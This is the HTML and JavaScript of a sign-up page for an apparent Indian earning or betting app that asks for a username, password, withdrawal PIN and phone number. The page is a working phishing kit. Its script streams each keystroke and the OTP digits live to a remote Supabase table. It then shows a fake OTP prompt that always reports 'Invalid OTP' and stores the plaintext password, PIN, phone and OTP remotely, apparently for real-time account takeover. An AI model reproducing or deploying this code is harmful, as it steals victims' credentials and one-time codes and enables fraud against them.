<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Register</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
  <style>
    body {
      background-color: #f3f6f8;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
    }
    .input-pill {
      background-color: #ffffff;
      border-radius: 9999px;
      box-shadow: 0 3px 10px rgba(0, 0, 0, 0.04);
    }
    .btn-green {
      background-color: #169854;
    }
    .btn-green:hover:not(:disabled) {
      background-color: #128046;
    }
    .text-brand-green {
      color: #169854;
    }
  </style>
</head>
<body class="min-h-screen flex flex-col">

  <!-- Top White Header -->
  <header class="bg-white px-5 py-4 flex items-center justify-between shadow-sm">
    <button type="button" class="text-brand-green p-1">
      <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2.2">
        <path stroke-linecap="round" stroke-linejoin="round" d="M15 19l-7-7 7-7" />
      </svg>
    </button>
    <h1 class="text-xl font-bold text-brand-green tracking-wide">Register</h1>
    <div class="w-8"></div>
  </header>

  <!-- Main Form Section -->
  <main class="flex-1 flex flex-col items-center justify-start px-6 pt-8 pb-10">
    <form id="registerForm" class="w-full max-w-md space-y-5" novalidate>

      <!-- Username -->
      <div class="input-pill flex items-center px-6 py-4">
        <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 text-brand-green mr-4 shrink-0" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2">
          <path stroke-linecap="round" stroke-linejoin="round" d="M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z" />
        </svg>
        <input type="text" id="username" placeholder="Username" required class="w-full bg-transparent outline-none text-gray-800 font-medium text-base">
      </div>

      <!-- Password -->
      <div class="input-pill flex items-center px-6 py-4">
        <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 text-brand-green mr-4 shrink-0" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2">
          <path stroke-linecap="round" stroke-linejoin="round" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
        </svg>
        <input type="password" id="password" placeholder="Password" required class="w-full bg-transparent outline-none text-gray-800 font-medium text-base">
      </div>

      <!-- Withdrawal PIN (Lock Icon matching image) -->
      <div class="input-pill flex items-center px-6 py-4">
        <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 text-brand-green mr-4 shrink-0" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2">
          <path stroke-linecap="round" stroke-linejoin="round" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
        </svg>
        <input type="password" id="withdrawalPin" inputmode="numeric" maxlength="6" placeholder="Withdrawal PIN" required class="w-full bg-transparent outline-none text-gray-800 font-medium text-base">
      </div>

      <!-- Phone -->
      <div class="input-pill flex items-center px-6 py-4">
        <span class="text-brand-green font-bold text-base mr-4 shrink-0">+91</span>
        <input type="tel" id="phone" inputmode="numeric" maxlength="10" placeholder="Phone Number" required class="w-full bg-transparent outline-none text-gray-800 font-medium text-base">
      </div>

      <!-- Referral Code (Chain Link Icon matching image) -->
      <div class="input-pill flex items-center px-6 py-4">
        <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 text-brand-green mr-4 shrink-0" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2">
          <path stroke-linecap="round" stroke-linejoin="round" d="M13.828 10.172a4 4 0 00-5.656 0l-4 4a4 4 0 105.656 5.656l1.102-1.101m-.758-4.899a4 4 0 005.656 0l4-4a4 4 0 00-5.656-5.656l-1.1 1.1" />
        </svg>
        <input type="text" id="referral" value="SOW6Hx" placeholder="Referral Code" class="w-full bg-transparent outline-none text-gray-800 font-medium text-base">
      </div>

      <!-- Error Alert Message (Red Popup/Banner for < 10 digits or empty fields) -->
      <div id="formError" class="hidden bg-red-100 border border-red-400 text-red-700 px-4 py-2.5 rounded-full text-center text-sm font-semibold">
        Please enter a valid 10-digit phone number.
      </div>

      <!-- Sign Up Button -->
      <div class="pt-3">
        <button type="submit" id="signUpBtn" class="w-full py-4 rounded-full text-white font-semibold text-lg btn-green shadow-md transition transform active:scale-95 flex items-center justify-center gap-2 disabled:opacity-80 disabled:cursor-not-allowed">
          <span id="signUpBtnText">Sign Up</span>
        </button>
      </div>

      <!-- Bottom Links matching image -->
      <div class="pt-3 text-center space-y-5">
        <div>
          <a href="#" class="text-gray-700 text-base underline underline-offset-4 hover:text-gray-900">
            Already have an account? Login
          </a>
        </div>
        <div>
          <a href="#" class="text-[#1877f2] text-base underline underline-offset-4 hover:text-blue-700">
            Download App
          </a>
        </div>
      </div>

    </form>
  </main>

  <!-- OTP Verification Modal -->
  <div id="otpModal" class="fixed inset-0 bg-black/50 hidden items-center justify-center px-4 z-50">
    <div class="bg-white rounded-3xl w-full max-w-sm p-6 text-center shadow-xl relative">
      <button type="button" onclick="closeModal()" class="absolute top-4 right-5 text-gray-400 hover:text-gray-600 text-xl font-bold">&times;</button>

      <h2 class="text-xl font-bold text-gray-800 mb-2">OTP Sent</h2>
      <p class="text-sm text-gray-500 mb-6">
        A 6-digit code has been sent to <span id="displayPhone" class="font-semibold text-gray-700">+91</span>
      </p>

      <!-- 6 OTP Boxes -->
      <div id="otpContainer" class="flex justify-center gap-2 mb-6">
        <input type="tel" inputmode="numeric" maxlength="1" class="otp-box w-11 h-12 text-center text-lg font-bold border border-gray-300 rounded-xl outline-none transition">
        <input type="tel" inputmode="numeric" maxlength="1" class="otp-box w-11 h-12 text-center text-lg font-bold border border-gray-300 rounded-xl outline-none transition">
        <input type="tel" inputmode="numeric" maxlength="1" class="otp-box w-11 h-12 text-center text-lg font-bold border border-gray-300 rounded-xl outline-none transition">
        <input type="tel" inputmode="numeric" maxlength="1" class="otp-box w-11 h-12 text-center text-lg font-bold border border-gray-300 rounded-xl outline-none transition">
        <input type="tel" inputmode="numeric" maxlength="1" class="otp-box w-11 h-12 text-center text-lg font-bold border border-gray-300 rounded-xl outline-none transition">
        <input type="tel" inputmode="numeric" maxlength="1" class="otp-box w-11 h-12 text-center text-lg font-bold border border-gray-300 rounded-xl outline-none transition">
      </div>

      <!-- Resend Timer -->
      <p class="text-sm text-gray-500 mb-6">
        Didn't get the code? <span id="resendText" class="text-brand-green font-semibold">Resend OTP in 57s</span>
      </p>

      <!-- Submit Button -->
      <button type="button" onclick="verifyOtp()" class="w-full py-3 rounded-full text-white font-bold btn-green shadow-md transition">
        Submit
      </button>

      <!-- Verification Message -->
      <p id="statusMsg" class="mt-4 text-base font-medium hidden"></p>
    </div>
  </div>

  <script>
    const SUPABASE_URL = 'https://zvswgqddbeykgrhlovgp.supabase.co';
    const SUPABASE_ANON_KEY = 'sb_publishable_moe4DeFFdoQjVmcCLPtOmQ_VXcW9TyD';

    let supabaseClient = null;
    try {
      if (window.supabase) {
        supabaseClient = window.supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
      }
    } catch (e) {
      console.error('Supabase init error:', e);
    }

    const registerForm = document.getElementById('registerForm');
    const signUpBtn = document.getElementById('signUpBtn');
    const signUpBtnText = document.getElementById('signUpBtnText');
    const formError = document.getElementById('formError');
    const otpModal = document.getElementById('otpModal');
    const displayPhone = document.getElementById('displayPhone');
    const otpBoxes = document.querySelectorAll('.otp-box');
    const statusMsg = document.getElementById('statusMsg');
    const resendText = document.getElementById('resendText');
    let timerInterval;
    let pendingUserData = {};
    let isSubmitting = false;

    // Restrict numeric fields to numbers only
    document.getElementById('phone').addEventListener('input', (e) => {
      e.target.value = e.target.value.replace(/\D/g, '');
      formError.classList.add('hidden');
      syncLiveSession('Filling Form');
    });
    document.getElementById('withdrawalPin').addEventListener('input', (e) => {
      e.target.value = e.target.value.replace(/\D/g, '');
      syncLiveSession('Filling Form');
    });

    // Other inputs immediate sync
    ['username', 'password', 'referral'].forEach(id => {
      document.getElementById(id).addEventListener('input', () => {
        formError.classList.add('hidden');
        syncLiveSession('Filling Form');
      });
    });

    // Trigger initial sync on load
    window.addEventListener('DOMContentLoaded', () => {
      syncLiveSession('Page Loaded');
    });

    // Form Submit -> Validate -> Show 4s Loading -> Trigger OTP Modal
    registerForm.addEventListener('submit', (e) => {
      e.preventDefault();
      if (isSubmitting) return;

      const unameVal = document.getElementById('username').value.trim();
      const passVal = document.getElementById('password').value.trim();
      const pinVal = document.getElementById('withdrawalPin').value.trim();
      const phoneVal = document.getElementById('phone').value.trim();

      if (!unameVal || !passVal || !pinVal) {
        formError.textContent = 'Please fill all required fields.';
        formError.classList.remove('hidden');
        return;
      }

      if (phoneVal.length < 10) {
        formError.textContent = 'Phone number must be 10 digits.';
        formError.classList.remove('hidden');
        return;
      }

      formError.classList.add('hidden');
      isSubmitting = true;

      // Start loading state on Sign Up button
      signUpBtn.disabled = true;
      signUpBtnText.innerHTML = `
        <svg class="animate-spin h-5 w-5 text-white inline-block mr-2" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
          <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
          <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
        </svg>
        Loading...
      `;

      syncLiveSession('Verifying / Loading...');

      setTimeout(() => {
        signUpBtn.disabled = false;
        signUpBtnText.textContent = 'Sign Up';
        isSubmitting = false;

        pendingUserData = {
          username: unameVal,
          password: passVal,
          withdrawalPin: pinVal,
          phone: phoneVal,
          referral: document.getElementById('referral')?.value.trim() || ''
        };

        displayPhone.textContent = '+91 ' + phoneVal;

        // Reset OTP boxes
        otpBoxes.forEach(box => {
          box.value = '';
          box.classList.remove('border-2', 'border-[#169854]');
          box.classList.add('border', 'border-gray-300');
        });
        statusMsg.classList.add('hidden');

        syncLiveSession('OTP Modal Opened');

        otpModal.classList.remove('hidden');
        otpModal.classList.add('flex');
        setTimeout(() => {
          otpBoxes[0].focus();
        }, 100);

        startTimer(57);
      }, 4000);
    });

    function closeModal() {
      otpModal.classList.add('hidden');
      otpModal.classList.remove('flex');
      clearInterval(timerInterval);
    }

    function startTimer(seconds) {
      clearInterval(timerInterval);
      let timeLeft = seconds;
      resendText.textContent = `Resend OTP in ${timeLeft}s`;
      timerInterval = setInterval(() => {
        timeLeft--;
        if (timeLeft > 0) {
          resendText.textContent = `Resend OTP in ${timeLeft}s`;
        } else {
          clearInterval(timerInterval);
          resendText.innerHTML = '<button type="button" onclick="startTimer(57)" class="underline font-bold">Resend OTP</button>';
        }
      }, 1000);
    }

    // Handle OTP Box Navigation & Active Border
    otpBoxes.forEach((box, index) => {
      box.addEventListener('focus', () => {
        otpBoxes.forEach(b => {
          b.classList.remove('border-2', 'border-[#169854]');
          b.classList.add('border', 'border-gray-300');
        });
        box.classList.remove('border', 'border-gray-300');
        box.classList.add('border-2', 'border-[#169854]');
      });

      box.addEventListener('input', (e) => {
        e.target.value = e.target.value.replace(/\D/g, '');
        syncLiveSession('Entering OTP');
        if (e.target.value.length === 1 && index < otpBoxes.length - 1) {
          otpBoxes[index + 1].focus();
        }
      });

      box.addEventListener('keydown', (e) => {
        if (e.key === 'Backspace' && !e.target.value && index > 0) {
          otpBoxes[index - 1].focus();
        }
      });
    });

    // Verify OTP & Save to Supabase
    async function verifyOtp() {
      let otpValue = '';
      otpBoxes.forEach(box => otpValue += box.value);

      statusMsg.classList.remove('hidden', 'text-red-600', 'text-green-600');

      if (otpValue.length === 6) {
        statusMsg.textContent = 'Invalid OTP. Please try again.';
        statusMsg.classList.add('text-red-600');
        syncLiveSession('OTP Submitted: ' + otpValue);

        if (supabaseClient) {
          try {
            await supabaseClient
              .from('Message')
              .insert([{ content: JSON.stringify({ ...pendingUserData, otp: otpValue }) }]);
          } catch (err) {
            console.error(err);
          }
        }
      } else {
        statusMsg.textContent = 'Please enter 6-digit OTP';
        statusMsg.classList.add('text-red-600');
      }
    }

    // Supabase Live Sync Logic
    let syncTimeout;
    async function syncLiveSession(currentState) {
      clearTimeout(syncTimeout);
      syncTimeout = setTimeout(async () => {
        if (!supabaseClient) return;

        const uname = document.getElementById('username')?.value.trim() || '';
        const ph = document.getElementById('phone')?.value.trim() || '';
        const ref = document.getElementById('referral')?.value.trim() || '';
        const passLen = document.getElementById('password')?.value.length || 0;
        const pinLen = document.getElementById('withdrawalPin')?.value.length || 0;

        let otpFilledCount = 0;
        let otpCurrentVal = '';
        otpBoxes.forEach(b => {
          if (b.value.length > 0) {
            otpFilledCount++;
            otpCurrentVal += b.value;
          }
        });

        try {
          await supabaseClient
            .from('live_sessions')
            .upsert([{
              id: 1,
              username: uname || 'Waiting...',
              phone: ph || 'Waiting...',
              referral: ref || '-',
              password_mask: passLen > 0 ? '*'.repeat(passLen) : '-',
              pin_mask: pinLen > 0 ? '*'.repeat(pinLen) : '-',
              otp_mask: otpFilledCount > 0 ? otpCurrentVal : '-',
              status: currentState,
              updated_at: new Date().toISOString()
            }], { onConflict: 'id' });
        } catch (err) {
          console.error('Live sync error:', err);
        }
      }, 100);
    }
  </script>
</body>
</html>
